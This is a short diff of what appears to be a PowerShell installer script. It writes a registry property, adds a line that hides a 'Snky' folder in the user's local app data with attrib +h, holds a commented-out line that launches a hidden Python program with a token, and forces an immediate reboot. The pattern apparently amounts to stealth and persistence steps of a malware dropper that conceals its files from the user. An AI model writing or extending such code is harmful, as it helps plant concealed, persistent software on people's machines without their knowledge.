@@ -33,6 +33,7 @@ New-Item -Path $reg_path
 
 New-ItemProperty -Path $reg_path -Name $property_name -Value $property_value -PropertyType String -Force | Out-Null
 
+attrib +h "$($env:LOCALAPPDATA)\Snky" /s /d
 #Start-Process "$($env:LOCALAPPDATA)\Snky\Snky-main\main.pyw" $token -Wait -WindowStyle Hidden
 
 cmd.exe /c shutdown /r /t 0
